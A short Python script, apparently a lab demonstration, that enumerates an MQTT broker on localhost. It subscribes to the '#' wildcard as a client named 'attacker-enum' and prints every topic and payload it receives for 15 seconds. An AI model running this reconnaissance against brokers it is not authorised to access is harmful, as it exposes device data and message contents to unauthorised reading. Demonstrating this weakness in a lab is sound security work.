import time, paho.mqtt.client as mqtt

discovered = set()

def on_message(client, userdata, msg):
    if msg.topic not in discovered:
        discovered.add(msg.topic)
        print(f"[enum] discovered topic: {msg.topic}  =  {msg.payload.decode(errors='replace')}")

client = mqtt.Client(client_id="attacker-enum")
client.on_message = on_message
client.connect("localhost", 1883, 60)
client.subscribe("#")          # <-- the attack: wildcard, no prior knowledge
print("[enum] subscribed to '#', mapping topic tree for 15s...")
client.loop_start()
time.sleep(15)
client.loop_stop()
print(f"\n[enum] DONE. {len(discovered)} topics discovered:")
for t in sorted(discovered):
    print(f"   {t}")
